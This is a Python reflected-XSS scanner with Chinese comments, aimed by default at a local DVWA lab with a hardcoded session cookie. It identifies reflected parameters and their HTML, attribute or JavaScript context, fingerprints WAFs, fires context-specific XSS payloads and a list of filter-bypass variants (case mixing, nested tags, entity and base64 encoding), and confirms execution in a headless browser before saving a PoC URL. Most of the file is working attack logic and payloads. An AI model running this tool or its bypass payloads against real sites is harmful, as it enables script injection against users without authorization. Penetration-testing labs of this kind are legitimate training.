#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
反射型 XSS 检测工具 (Reflected XSS Scanner)  v1.0

仅用于已获得授权的测试环境（如本地搭建的 DVWA 靶场）。
成功判定标准：在真实浏览器中触发 alert() 弹窗。
本工具不会做任何写操作/破坏性操作，只会发送 GET/POST 请求读取响应。

默认目标 : http://127.0.0.1/vulnerabilities/xss_r/
默认 Cookie: PHPSESSID=pio9vir55opk5pi13vvr61m6k0; security=low

用法示例:
  python xss_scanner.py                     # 全自动检测 + 浏览器验证
  python xss_scanner.py --no-browser        # 只做静态(无需浏览器)检测
  python xss_scanner.py --param name --method GET
  python xss_scanner.py --payload "<script>alert(1)</script>" --verify-only
"""

from __future__ import annotations

import argparse
import json
import os
import random
import re
import string
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

VERSION = "1.0"

DEFAULT_URL = "http://127.0.0.1/vulnerabilities/xss_r/"
DEFAULT_COOKIE = "PHPSESSID=pio9vir55opk5pi13vvr61m6k0; security=low"
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# ----------------------------------------------------------------------------
# 终端输出
# ----------------------------------------------------------------------------
class Log:
    verbose = False
    _sinks: List[Any] = []

    PREFIX = {"info": "[*] ", "ok": "[+] ", "bad": "[-] ",
              "warn": "[!] ", "dbg": "[.] ", "head": ""}

    @staticmethod
    def _enc(s: str) -> str:
        try:
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
        return s

    @classmethod
    def add_sink(cls, fn) -> None:
        cls._sinks.append(fn)

    @classmethod
    def remove_sink(cls, fn) -> None:
        try:
            cls._sinks.remove(fn)
        except ValueError:
            pass

    @classmethod
    def _emit(cls, level: str, m) -> None:
        msg = str(m)
        for fn in list(cls._sinks):
            try:
                fn(level, msg)
            except Exception:
                pass
        if level == "head":
            print(cls._enc("\n" + "=" * 70 + "\n" + msg + "\n" + "=" * 70))
        elif level == "dbg":
            if cls.verbose:
                print(cls._enc("[.] " + msg))
        else:
            print(cls._enc(cls.PREFIX.get(level, "    ") + msg))

    @classmethod
    def info(cls, m): cls._emit("info", m)
    @classmethod
    def ok(cls, m): cls._emit("ok", m)
    @classmethod
    def bad(cls, m): cls._emit("bad", m)
    @classmethod
    def warn(cls, m): cls._emit("warn", m)
    @classmethod
    def dbg(cls, m): cls._emit("dbg", m)
    @classmethod
    def head(cls, m): cls._emit("head", m)


# ----------------------------------------------------------------------------
# HTTP 会话
# ----------------------------------------------------------------------------
@dataclass
class Response:
    status: Optional[int] = None
    url: str = ""
    headers: Any = None
    text: str = ""
    length: int = 0
    error: Optional[str] = None

    @property
    def ok(self) -> bool:
        return self.error is None and self.status is not None


def _decode(raw: bytes, ctype: str) -> str:
    m = re.search(r"charset=[\"']?([\w\-]+)", ctype or "", re.I)
    enc = m.group(1) if m else "utf-8"
    try:
        return raw.decode(enc, errors="replace")
    except LookupError:
        return raw.decode("utf-8", errors="replace")


class Session:
    def __init__(self, cookie: str = "", timeout: float = 15.0,
                 proxy: str = "", ua: str = DEFAULT_UA, delay: float = 0.05):
        self.cookie: Dict[str, str] = {}
        self.timeout = timeout
        self.ua = ua
        self.delay = delay
        self.proxy = proxy
        if cookie:
            for part in cookie.split(";"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    self.cookie[k.strip()] = v.strip()

    # -- cookie --------------------------------------------------------------
    def cookie_header(self) -> str:
        return "; ".join("%s=%s" % (k, v) for k, v in self.cookie.items())

    def _absorb(self, hdrs) -> None:
        try:
            for sc in hdrs.get_all("Set-Cookie") or []:
                first = sc.split(";", 1)[0]
                if "=" in first:
                    k, v = first.split("=", 1)
                    self.cookie[k.strip()] = v.strip()
        except Exception:
            pass

    # -- request -------------------------------------------------------------
    def request(self, url: str, method: str = "GET",
                data: Optional[str] = None,
                extra_headers: Optional[Dict[str, str]] = None) -> Response:
        if self.delay:
            time.sleep(self.delay)
        headers = {
            "User-Agent": self.ua,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
            "Connection": "close",
        }
        if self.cookie:
            headers["Cookie"] = self.cookie_header()
        if method.upper() == "POST":
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if extra_headers:
            headers.update(extra_headers)

        body = data.encode("utf-8") if isinstance(data, str) else data
        req = urllib.request.Request(url, data=body,
                                     headers=headers, method=method.upper())
        handlers = []
        if self.proxy:
            handlers.append(urllib.request.ProxyHandler(
                {"http": self.proxy, "https": self.proxy}))
        opener = urllib.request.build_opener(*handlers)

        try:
            r = opener.open(req, timeout=self.timeout)
            status, hdrs, raw = r.status, r.headers, r.read()
        except urllib.error.HTTPError as e:
            status, hdrs, raw = e.code, e.headers, e.read()
        except Exception as e:  # 连接失败/超时
            return Response(url=url, error="%s: %s" % (type(e).__name__, e))

        self._absorb(hdrs)
        ctype = hdrs.get("Content-Type", "") if hdrs else ""
        text = _decode(raw, ctype)
        return Response(status=status, url=url, headers=hdrs,
                        text=text, length=len(raw))


# ----------------------------------------------------------------------------
# Payload 库
# ----------------------------------------------------------------------------
# 结构: context -> [(payload, 说明, 是否需要交互)]
PAYLOADS: Dict[str, List[Tuple[str, str, bool]]] = {
    "html": [
        ("<script>alert(1)</script>", "经典 script 标签", False),
        ("<script>alert`1`</script>", "script + 模板字符串(无括号)", False),
        ("<img src=x onerror=alert(1)>", "img onerror 自动触发", False),
        ("<svg onload=alert(1)>", "svg onload", False),
        ("<details open ontoggle=alert(1)>", "details ontoggle", False),
        ("<body onload=alert(1)>", "body onload", False),
        ("<iframe src=javascript:alert(1)>", "iframe javascript:", False),
        ("<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
         "mXSS 变形", False),
        ("<video><source onerror=alert(1)>", "video/source onerror", False),
        ("<a href=javascript:alert(1)>click</a>", "a href javascript:(需点击)", True),
    ],
    "attr_dq": [  # 位于 value="..." 之内
        ('"><script>alert(1)</script>', '闭合双引号 + script', False),
        ('" autofocus onfocus="alert(1)', '闭合 + autofocus/onfocus', False),
        ('"><svg onload=alert(1)>', '闭合 + svg onload', False),
        ('"><img src=x onerror=alert(1)>', '闭合 + img onerror', False),
        ('" onmouseover="alert(1)', '闭合 + onmouseover(需交互)', True),
    ],
    "attr_sq": [  # 位于 value='...' 之内
        ("'><script>alert(1)</script>", '闭合单引号 + script', False),
        ("' autofocus onfocus='alert(1)", '闭合 + autofocus/onfocus', False),
        ("'><svg onload=alert(1)>", '闭合 + svg onload', False),
        ("'><img src=x onerror=alert(1)>", '闭合 + img onerror', False),
    ],
    "js": [  # 位于 <script> ... </script> 的字符串里
        ("';alert(1);//", "闭合单引号", False),
        ('";alert(1);//', "闭合双引号", False),
        ("'-alert(1)-'", "算术表达式注入", False),
        ("</script><script>alert(1)</script>", "闭合 script 标签", False),
        ("\\';alert(1);//", "转义单引号闭合", False),
    ],
    "tag": [  # 位于标签内部但没有引号包裹 (如 <input NAME>)
        ("autofocus onfocus=alert(1)", "注入新属性", False),
        ("onfocus=alert(1) autofocus", "注入新属性(顺序2)", False),
        ("onmouseover=alert(1)", "注入事件属性(需交互)", True),
    ],
}

# WAF / 过滤绕过候选（HTML 上下文为主）
BYPASS_PAYLOADS: List[Tuple[str, str]] = [
    ("<script>alert(1)</script>", "原始(基准)"),
    ("<ScRiPt>alert(1)</ScRiPt>", "大小写混合"),
    ("<scr<script>ipt>alert(1)</script>", "标签嵌套打断(绕过一次性删除 <script>)"),
    ("<svg onload=alert(1)>", "SVG onload(无 script 关键字)"),
    ("<img src=x onerror=alert(1)>", "IMG onerror(无 script 关键字)"),
    ("<img\tsrc=x\tonerror=alert(1)>", "TAB 分隔属性"),
    ("<img\nsrc=x\nonerror=alert(1)>", "换行分隔属性"),
    ("<img/src=x/onerror=alert(1)>", "斜杠分隔属性"),
    ("<details open ontoggle=alert(1)>", "details ontoggle"),
    ("<body onload=alert(1)>", "body onload"),
    ("<iframe src=javascript:alert(1)>", "iframe javascript:"),
    ("<img src=x onerror=&#97;lert(1)>", "HTML 十进制实体编码"),
    ("<img src=x onerror=&#x61;lert(1)>", "HTML 十六进制实体编码"),
    ("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "eval+base64(隐藏 alert 关键字)"),
    ("<script>\\u0061lert(1)</script>", "JS Unicode 转义"),
    ("<script>window['al'+'ert'](1)</script>", "字符串拼接调用"),
    ("<script>top['al'+'ert'](1)</script>", "top 对象 + 拼接"),
    ("<svg onload=alert`1`>", "模板字符串调用(无括号)"),
    ("<svg/onload=confirm(1)>", "confirm 探测(等价弹窗)"),
]

WAF_BODY_SIGNATURES = [
    "mod_security", "modsecurity", "not acceptable", "request blocked",
    "request rejected", "access denied", "web application firewall",
    "cloudflare", "incapsula", "sucuri", "safedog", "安全狗", "云锁",
    "拦截", "非法请求", "存在攻击", "已被拦截", "waf拦截", "chaitin",
]
WAF_HEADER_SIGNATURES = ["cf-ray", "x-sucuri-id", "x-powered-by-plesk",
                         "server: cloudflare", "x-waf", "x-mod-security"]
BLOCK_STATUS = {400, 401, 403, 406, 418, 419, 429, 501, 503}


# ----------------------------------------------------------------------------
# 工具函数
# ----------------------------------------------------------------------------
def rand_token(n: int = 6) -> str:
    return "".join(random.choice(string.ascii_letters) for _ in range(n))


def build_url(base: str, param: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(base)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q = [(k, v) for k, v in q if k != param]
    q.append((param, payload))
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q), parts.fragment))


def send_payload(sess: Session, base: str, param: str, payload: str,
                 method: str = "GET",
                 extra: Optional[Dict[str, str]] = None) -> Response:
    if method.upper() == "POST":
        data = urllib.parse.urlencode({param: payload})
        return sess.request(base, "POST", data=data, extra_headers=extra)
    return sess.request(build_url(base, param, payload), "GET", extra_headers=extra)


def scan_state(body: str, upto: int) -> Tuple[bool, Optional[str], bool]:
    """从 0 扫描到 upto，返回 (是否在标签内, 当前引号, 是否在 script 内)。"""
    i, n = 0, min(upto, len(body))
    in_tag = False
    quote: Optional[str] = None
    in_script = False
    lower = body.lower()
    while i < n:
        if in_script:
            if lower.startswith("</script", i):
                in_script = False
                i += 8
                continue
            i += 1
            continue
        if in_tag:
            ch = body[i]
            if quote:
                if ch == quote:
                    quote = None
            elif ch in "\"'":
                quote = ch
            elif ch == ">":
                in_tag = False
            i += 1
            continue
        ch = body[i]
        if ch == "<":
            if lower.startswith("<script", i):
                j = body.find(">", i)
                if j == -1:
                    break
                in_script = True
                i = j + 1
                continue
            in_tag = True
        i += 1
    return in_tag, quote, in_script


def classify_context(body: str, payload: str) -> Dict[str, Any]:
    idx = body.find(payload)
    if idx == -1:
        return {"found": False}
    in_tag, quote, in_script = scan_state(body, idx)
    if in_script:
        ctx = "js"
    elif in_tag and quote == '"':
        ctx = "attr_dq"
    elif in_tag and quote == "'":
        ctx = "attr_sq"
    elif in_tag:
        ctx = "tag"
    else:
        ctx = "html"
    lo = max(0, idx - 80)
    hi = min(len(body), idx + len(payload) + 80)
    snippet = body[lo:hi].replace("\n", " ").replace("\r", "")
    return {"found": True, "index": idx, "context": ctx,
            "quote": quote, "in_tag": in_tag, "in_script": in_script,
            "snippet": snippet}


def detect_form(html: str) -> Dict[str, Any]:
    """从页面自动提取表单 action/method/参数名。"""
    out: Dict[str, Any] = {}
    m = re.search(r"<form[^>]*>", html, re.I)
    if not m:
        # 退化为找所有 input 的 name
        names = re.findall(r"<input[^>]*name=[\"']([^\"']+)[\"']", html, re.I)
        if names:
            out["params"] = names
        return out
    form_tag = m.group(0)
    am = re.search(r"action=[\"']([^\"']*)[\"']", form_tag, re.I)
    mm = re.search(r"method=[\"'](\w+)[\"']", form_tag, re.I)
    out["action"] = am.group(1) if am else ""
    out["method"] = (mm.group(1) if mm else "GET").upper()
    body = html[m.end():]
    body = body.split("</form>", 1)[0]
    names = re.findall(r"<input[^>]*name=[\"']([^\"']+)[\"']", body, re.I)
    out["params"] = names
    return out


def char_survival(sess: Session, base: str, param: str, method: str,
                  extra) -> Optional[str]:
    """发送特殊字符探针，返回反射区里的字符存活情况。"""
    a, b = "zqA" + rand_token(4), "zqB" + rand_token(4)
    middle = "<q>\"w'e/r(t)y"
    probe = a + middle + b
    r = send_payload(sess, base, param, probe, method, extra)
    if not r.ok:
        return None
    i = r.text.find(a)
    if i == -1:
        return None
    j = r.text.find(b, i)
    region = r.text[i + len(a): j if j != -1 else i + len(a) + 200]
    return region.strip()


def waf_probe(sess: Session, base: str, param: str, method: str,
              extra) -> Dict[str, Any]:
    """判断目标是否存在 WAF / 输入过滤。"""
    benign = "zq" + rand_token(8)
    r0 = send_payload(sess, base, param, benign, method, extra)
    r1 = send_payload(sess, base, param, "<script>alert(1)</script>",
                      method, extra)
    result = {"baseline_status": r0.status, "attack_status": r1.status,
              "suspected": False, "evidence": []}

    if not r1.ok:
        result["evidence"].append("攻击请求异常: %s" % r1.error)
        result["suspected"] = True
        return result

    # 1) 状态码异常
    if r1.status in BLOCK_STATUS and (r0.status or 200) not in BLOCK_STATUS:
        result["suspected"] = True
        result["evidence"].append("攻击请求返回可疑状态码 %s（基线 %s）"
                                  % (r1.status, r0.status))
    # 2) 响应体特征
    low = r1.text.lower()
    for sig in WAF_BODY_SIGNATURES:
        if sig in low:
            result["suspected"] = True
            result["evidence"].append("响应体命中 WAF 特征: %r" % sig)
            break
    # 3) 响应头特征
    try:
        htxt = str(r1.headers).lower()
        for sig in WAF_HEADER_SIGNATURES:
            if sig in htxt:
                result["suspected"] = True
                result["evidence"].append("响应头命中特征: %r" % sig)
                break
    except Exception:
        pass
    # 4) 攻击响应体显著变小（典型拦截页）
    if r0.length and r1.length and r1.length < r0.length * 0.5 and r1.length < 400:
        result["suspected"] = True
        result["evidence"].append("攻击响应长度骤降(%d -> %d)，疑似拦截页"
                                  % (r0.length, r1.length))
    return result


# ----------------------------------------------------------------------------
# 浏览器验证（alert 弹窗）
# ----------------------------------------------------------------------------
def browser_available() -> str:
    try:
        import playwright  # noqa: F401
        return "playwright"
    except Exception:
        pass
    try:
        import selenium  # noqa: F401
        return "selenium"
    except Exception:
        pass
    return ""


def verify_alert(url: str, cookie: str, timeout: int = 25) -> Dict[str, Any]:
    """用无头浏览器打开 url，捕获 alert 弹窗。成功即证明反射型 XSS 可执行。

    任何异常都会被吞掉并转成 error 字段，绝不向上抛——
    浏览器验证只是"加强证据"，不能让它把整次扫描搞崩。
    """
    engine = browser_available()
    try:
        if engine == "playwright":
            return _verify_playwright(url, cookie, timeout)
        if engine == "selenium":
            return _verify_selenium(url, cookie, timeout)
    except Exception as e:                       # noqa: BLE001
        return {"engine": engine, "fired": False, "dialogs": [],
                "error": "%s: %s" % (type(e).__name__, e)}
    return {"engine": "", "fired": False, "dialogs": [],
            "error": "未安装 playwright / selenium，无法做浏览器验证"}


def _parse_cookies(cookie: str, url: str) -> List[Dict[str, Any]]:
    parts = urllib.parse.urlsplit(url)
    out = []
    for kv in cookie.split(";"):
        if "=" not in kv:
            continue
        k, v = kv.split("=", 1)
        out.append({"name": k.strip(), "value": v.strip(),
                    "domain": parts.hostname, "path": "/"})
    return out


def _verify_playwright(url: str, cookie: str, timeout: int) -> Dict[str, Any]:
    dialogs: List[str] = []
    errors: List[str] = []
    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:                       # noqa: BLE001
        return {"engine": "playwright", "fired": False, "dialogs": [],
                "error": "playwright 导入失败: %s" % e}

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
            try:
                ctx = browser.new_context(
                    ignore_https_errors=True,
                    viewport={"width": 1280, "height": 800})
                if cookie:
                    try:
                        ctx.add_cookies(_parse_cookies(cookie, url))
                    except Exception as e:       # noqa: BLE001
                        errors.append("cookie 注入失败: %s" % e)
                page = ctx.new_page()

                def on_dialog(d):
                    dialogs.append(d.message)
                    try:
                        d.dismiss()
                    except Exception:
                        pass

                page.on("dialog", on_dialog)
                page.on("pageerror",
                        lambda e: errors.append("pageerror: %s" % e))
                try:
                    page.goto(url, timeout=timeout * 1000, wait_until="load")
                except Exception as e:           # noqa: BLE001
                    errors.append("goto: %s" % e)
                # 给 onerror / onload / ontoggle 等留出触发时间
                try:
                    page.wait_for_timeout(2500)
                except Exception:
                    pass
            finally:
                try:
                    browser.close()
                except Exception:
                    pass
    except Exception as e:                       # noqa: BLE001
        msg = str(e)
        if "Executable doesn't exist" in msg or "playwright install" in msg:
            msg = ("Chromium 未安装，请先执行: "
                   "python -m playwright install chromium")
        return {"engine": "playwright", "fired": bool(dialogs),
                "dialogs": dialogs,
                "error": ("; ".join(errors) + "; " + msg).strip("; ")}

    return {"engine": "playwright", "fired": bool(dialogs),
            "dialogs": dialogs,
            "error": "; ".join(errors) if not dialogs else ""}


def _verify_selenium(url: str, cookie: str, timeout: int) -> Dict[str, Any]:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.common.exceptions import TimeoutException

    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--ignore-certificate-errors")
    driver = None
    dialogs: List[str] = []
    try:
        driver = webdriver.Chrome(options=opts)
        parts = urllib.parse.urlsplit(url)
        driver.get("%s://%s/" % (parts.scheme, parts.netloc))
        for kv in cookie.split(";"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                try:
                    driver.add_cookie({"name": k.strip(), "value": v.strip()})
                except Exception:
                    pass
        driver.get(url)
        try:
            WebDriverWait(driver, timeout).until(
                lambda d: d.switch_to.alert is not None)
            dialogs.append(driver.switch_to.alert.text)
            driver.switch_to.alert.dismiss()
        except TimeoutException:
            pass
        except Exception:
            pass
    except Exception as e:
        return {"engine": "selenium", "fired": bool(dialogs),
                "dialogs": dialogs, "error": str(e)}
    finally:
        if driver:
            try:
                driver.quit()
            except Exception:
                pass
    return {"engine": "selenium", "fired": bool(dialogs),
            "dialogs": dialogs, "error": "" if dialogs else "未捕获到弹窗"}


# ----------------------------------------------------------------------------
# 主流程
# ----------------------------------------------------------------------------
def run(args) -> Dict[str, Any]:
    Log.verbose = args.verbose
    sess = Session(cookie=args.cookie, timeout=args.timeout,
                   proxy=args.proxy, delay=args.delay)
    report: Dict[str, Any] = {
        "tool": "reflected-xss-scanner", "version": VERSION,
        "target": args.url, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "cookie": args.cookie, "findings": [], "waf": {}, "notes": [],
    }

    # ---- 1. 基准访问 ------------------------------------------------------
    Log.head("1. 目标连通性 / 会话校验")
    base = sess.request(args.url)
    if not base.ok:
        Log.bad("无法访问目标: %s" % base.error)
        report["error"] = base.error
        return report
    Log.ok("HTTP %s  长度=%d" % (base.status, base.length))
    title = re.search(r"<title>(.*?)</title>", base.text, re.I | re.S)
    if title:
        Log.info("页面标题: %s" % title.group(1).strip())
    if "login.php" in base.url.lower() or (
            "login.php" in base.text.lower()
            and "username" in base.text.lower()):
        Log.warn("响应指向登录页，Cookie 可能已失效。")

    # ---- 2. 参数识别 ------------------------------------------------------
    Log.head("2. 参数识别")
    form = detect_form(base.text)
    method = args.method or form.get("method") or "GET"
    param = args.param
    if not param:
        cands = [p for p in form.get("params", [])
                 if p.lower() not in ("submit", "btnsubmit", "user_token")]
        param = cands[0] if cands else "name"
        Log.info("自动识别表单参数: %s (method=%s)" % (cands or "无", method))
    else:
        Log.info("使用指定参数: %s (method=%s)" % (param, method))
    action = (form.get("action") or "").strip()
    if action in ("", "#", "javascript:void(0)", "javascript:;"):
        action = args.url
    elif not action.startswith("http"):
        action = urllib.parse.urljoin(args.url, action)
    action = urllib.parse.urldefrag(action)[0] or args.url
    target = action if args.method is None else args.url
    Log.info("实际提交地址: %s" % target)
    report["param"] = param
    report["method"] = method

    # ---- 3. 反射检测 ------------------------------------------------------
    Log.head("3. 反射点检测")
    token = "zq" + rand_token(8) + "qz"
    r = send_payload(sess, target, param, token, method)
    reflected = r.ok and token in r.text
    report["reflected"] = reflected
    if not reflected:
        Log.bad("参数 %s 的值未在响应中反射。" % param)
        Log.info("可能：参数名错误 / 会话失效 / 输出被彻底过滤。")
        # 仍尝试 WAF 判断
    else:
        Log.ok("参数 %s 的值成功反射到响应中。" % param)
        ctx = classify_context(r.text, token)
        Log.info("反射上下文: %s" % ctx.get("context"))
        Log.info("上下文片段: ...%s..." % ctx.get("snippet"))
        report["context"] = ctx

    # ---- 4. 字符存活分析 --------------------------------------------------
    survival = None
    if reflected:
        Log.head("4. 特殊字符过滤分析")
        survival = char_survival(sess, target, param, method, None)
        report["char_survival"] = survival
        if survival is None:
            Log.warn("探针未反射，无法分析字符过滤。")
        else:
            Log.info("探针反射结果: %r" % survival)
            filtered = [c for c in "<>\"'/()" if c not in survival]
            raw = [c for c in "<>\"'/()" if c in survival]
            if raw:
                Log.ok("未被编码/过滤的字符: %s" % " ".join(raw))
            if filtered:
                Log.warn("被编码/过滤(或未原样出现)的字符: %s" % " ".join(filtered))
                for c, ent in [("<", "&lt;"), (">", "&gt;"), ('"', "&quot;"),
                               ("'", "&#039;"), ("'", "&#39;")]:
                    if c in filtered and ent.lower() in survival.lower():
                        Log.info("  %r 被编码为 %s" % (c, ent))

    # ---- 5. WAF / 过滤检测 ------------------------------------------------
    Log.head("5. 防火墙 / WAF 检测")
    waf = waf_probe(sess, target, param, method, None)
    report["waf"] = waf
    if waf["suspected"]:
        Log.warn("疑似存在 WAF / 输入过滤:")
        for e in waf["evidence"]:
            Log.info("  - " + e)
    else:
        Log.ok("未发现明显的 WAF 拦截特征。")

    # ---- 6. 上下文匹配 Payload 尝试 --------------------------------------
    Log.head("6. Payload 注入测试")
    ctx_key = (report.get("context") or {}).get("context", "html")
    candidates = PAYLOADS.get(ctx_key, PAYLOADS["html"])
    # 若 HTML 上下文，也顺带测试通用载荷
    tried: List[Dict[str, Any]] = []
    best: Optional[Dict[str, Any]] = None

    for payload, desc, needs_click in candidates:
        if args.max_payloads and len(tried) >= args.max_payloads:
            break
        resp = send_payload(sess, target, param, payload, method)
        item = {"payload": payload, "desc": desc,
                "needs_interaction": needs_click}
        if not resp.ok:
            item["result"] = "请求失败: %s" % resp.error
            tried.append(item)
            continue
        if payload in resp.text:
            item["result"] = "原样反射(未编码) => 极可能可执行"
            item["ok"] = True
            if best is None or (best.get("needs_interaction") and not needs_click):
                best = item
        else:
            # 检查是否被编码
            esc = (payload.replace("<", "&lt;").replace(">", "&gt;")
                   .replace('"', "&quot;").replace("'", "&#039;"))
            if esc in resp.text:
                item["result"] = "被 HTML 实体编码 => 不可执行"
            elif resp.status in BLOCK_STATUS:
                item["result"] = "被拦截 (HTTP %s)" % resp.status
            else:
                item["result"] = "未反射 / 被过滤"
        tried.append(item)
        Log.info("%-45s -> %s" % (payload[:45], item["result"]))

    report["payload_trials"] = tried

    # ---- 7. WAF 绕过尝试 --------------------------------------------------
    bypass_hits: List[Dict[str, str]] = []
    if waf["suspected"] or best is None:
        Log.head("7. 绕过尝试 (WAF/过滤器)")
        for payload, desc in BYPASS_PAYLOADS:
            resp = send_payload(sess, target, param, payload, method)
            if not resp.ok:
                Log.info("%-42s -> 请求失败" % desc)
                continue
            if payload in resp.text:
                Log.ok("%-42s -> 通过并原样反射!" % desc)
                bypass_hits.append({"payload": payload, "desc": desc})
                if best is None:
                    best = {"payload": payload, "desc": desc,
                            "needs_interaction": False, "ok": True,
                            "result": "绕过成功(原样反射)"}
            elif resp.status in BLOCK_STATUS:
                Log.info("%-42s -> 被拦截(%s)" % (desc, resp.status))
            else:
                Log.info("%-42s -> 未反射/被过滤" % desc)
        report["bypass_hits"] = bypass_hits

    # ---- 8. 浏览器验证 ----------------------------------------------------
    Log.head("8. 浏览器 alert() 验证")
    browser_result = {"engine": browser_available(), "fired": False}
    if args.no_browser:
        Log.warn("已跳过浏览器验证 (--no-browser)。")
    elif not browser_available():
        Log.warn("未安装 playwright/selenium，跳过真实弹窗验证。")
        Log.info("安装方法: pip install playwright && python -m playwright install chromium")
    else:
        pool: List[str] = []
        if args.payload:
            pool.append(args.payload)
        if best and best["payload"] not in pool:
            pool.append(best["payload"])
        for h in bypass_hits:
            if h["payload"] not in pool:
                pool.append(h["payload"])
        if not pool and ctx_key:
            pool = [p for p, _, _ in PAYLOADS.get(ctx_key, [])[:3]]

        for payload in pool[:5]:
            url = build_url(target, param, payload) if method == "GET" else args.url
            Log.info("尝试: %s" % payload[:60])
            if method == "POST":
                Log.warn("POST 表单无法用 URL 直接复现，跳过浏览器验证。")
                break
            try:
                res = verify_alert(url, args.cookie, args.timeout * 2)
            except Exception as e:               # noqa: BLE001
                res = {"engine": browser_available(), "fired": False,
                       "dialogs": [],
                       "error": "%s: %s" % (type(e).__name__, e)}
            if res.get("error") and not res.get("fired"):
                Log.warn("浏览器验证未完成: %s" % res["error"])
            Log.dbg("engine=%s fired=%s dialogs=%s err=%s" % (
                res.get("engine"), res.get("fired"),
                res.get("dialogs"), res.get("error")))
            if res.get("fired"):
                best = {"payload": payload, "desc": "浏览器确认弹窗",
                        "needs_interaction": False, "ok": True,
                        "verified": True, "url": url,
                        "dialog": (res.get("dialogs") or [""])[0]}
                browser_result = res
                Log.ok("★ 浏览器捕获到 alert 弹窗: %r" % best["dialog"])
                break
            else:
                Log.info("  未触发弹窗 %s" % (res.get("error") or ""))
        browser_result = browser_result or {}
    report["browser"] = browser_result

    # ---- 9. 结论 ----------------------------------------------------------
    Log.head("9. 结论 / PoC")
    if best:
        report["vulnerable"] = True
        report["poc"] = best
        url = best.get("url") or (build_url(target, param, best["payload"])
                                  if method == "GET" else "")
        report["poc_url"] = url
        Log.ok("确认存在反射型 XSS。")
        Log.info("Payload : %s" % best["payload"])
        if url:
            Log.info("PoC URL : %s" % url)
        if best.get("verified"):
            Log.ok("已通过真实浏览器验证 alert() 弹窗。")
        else:
            Log.warn("未经真实浏览器验证（静态判定为可执行反射）。")
    else:
        report["vulnerable"] = False
        Log.bad("未找到可用的 XSS payload。")
        if waf["suspected"]:
            Log.warn("目标存在 WAF/过滤，请参考 README 的绕过分析。")

    # ---- 10. 落盘 ---------------------------------------------------------
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump(report, f, ensure_ascii=False, indent=2)
        Log.info("报告已保存: %s" % args.json)
    if args.poc_out and report.get("poc_url"):
        with open(args.poc_out, "w", encoding="utf-8") as f:
            f.write(report["poc_url"] + "\n")
            f.write(report["poc"]["payload"] + "\n")
        Log.info("PoC 已保存: %s" % args.poc_out)
    return report


def verify_only(args) -> Dict[str, Any]:
    """只验证给定 payload 是否能弹窗（不做完整扫描）。"""
    Log.head("浏览器验证模式")
    if not args.payload:
        Log.bad("--verify-only 需要配合 --payload 使用")
        return {"vulnerable": False, "error": "no payload"}
    param = args.param or "name"
    url = build_url(args.url, param, args.payload)
    Log.info("Payload : %s" % args.payload)
    Log.info("PoC URL : %s" % url)
    if not browser_available():
        Log.warn("未安装 playwright/selenium，无法做弹窗验证。")
        return {"vulnerable": False, "error": "no browser engine",
                "poc_url": url, "poc_payload": args.payload}
    res = verify_alert(url, args.cookie, args.timeout * 2)
    if res.get("fired"):
        Log.ok("★ 捕获到 alert 弹窗: %r" % (res.get("dialogs") or [""])[0])
        if args.poc_out:
            with open(args.poc_out, "w", encoding="utf-8") as f:
                f.write(url + "\n" + args.payload + "\n")
            Log.info("PoC 已保存: %s" % args.poc_out)
        return {"vulnerable": True, "poc_url": url,
                "poc_payload": args.payload, "browser": res}
    Log.bad("未捕获到弹窗: %s" % (res.get("error") or "页面未触发 dialog"))
    return {"vulnerable": False, "poc_url": url, "browser": res}


def parse_args():
    ap = argparse.ArgumentParser(
        description="反射型 XSS 检测工具 (仅限授权测试环境)")
    ap.add_argument("--url", default=DEFAULT_URL, help="目标 URL")
    ap.add_argument("--cookie", default=DEFAULT_COOKIE, help="Cookie 字符串")
    ap.add_argument("--param", default=None, help="注入参数名(默认自动识别)")
    ap.add_argument("--method", default=None, choices=["GET", "POST"],
                    help="HTTP 方法(默认自动识别)")
    ap.add_argument("--payload", default=None, help="指定单个 payload 直接验证")
    ap.add_argument("--verify-only", action="store_true",
                    help="只做浏览器验证(需配合 --payload)")
    ap.add_argument("--no-browser", action="store_true", help="跳过浏览器验证")
    ap.add_argument("--max-payloads", type=int, default=0,
                    help="每上下文最多尝试的 payload 数(0=全部)")
    ap.add_argument("--timeout", type=float, default=15.0, help="HTTP 超时(秒)")
    ap.add_argument("--delay", type=float, default=0.05, help="请求间隔(秒)")
    ap.add_argument("--proxy", default="", help="HTTP 代理, 如 http://127.0.0.1:8080")
    ap.add_argument("--json", default="xss_report.json", help="JSON 报告路径")
    ap.add_argument("--poc-out", default="poc.txt", help="PoC 输出文件")
    ap.add_argument("-v", "--verbose", action="store_true", help="详细输出")
    return ap.parse_args()


if __name__ == "__main__":
    _args = parse_args()
    try:
        if _args.verify_only:
            _rep = verify_only(_args)
        else:
            _rep = run(_args)
        if _args.json:
            with open(_args.json, "w", encoding="utf-8") as _f:
                json.dump(_rep, _f, ensure_ascii=False, indent=2)
    except KeyboardInterrupt:
        print("\n[!] 已中断")
        sys.exit(130)
